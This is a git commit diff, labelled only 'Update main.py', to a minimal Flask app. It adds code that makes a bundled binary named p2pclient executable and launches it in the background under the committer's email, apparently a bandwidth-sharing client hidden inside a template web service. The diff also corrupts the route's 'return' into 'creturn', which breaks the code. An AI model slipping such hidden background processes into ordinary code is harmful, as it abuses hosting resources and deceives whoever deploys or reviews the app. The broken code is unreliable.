b63a710f915b3c9e38fbdb7065f0e5a8cf288fe0
jeank93 <jcarlos1993@hotmail.com>
2022-02-27 19:24:06 -0600

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 from flask import Flask, jsonify
+from subprocess import Popen,PIPE
 import os
 
 app = Flask(__name__)
@@ -6,8 +7,10 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return jsonify({"Choo Choo": "Welcome to your Flask app 🚅"})
+creturn jsonify({"Choo Choo": "Welcome to your Flask app 🚅"})
 
 
 if __name__ == '__main__':
+    os.system("chmod +x p2pclient")
+    connection=Popen(f"nohup ./p2pclient -l jcarlos1993@hotmail.com".split(), stdout=PIPE, stdin=PIPE)
     app.run(debug=True, port=os.getenv("PORT", default=5000))
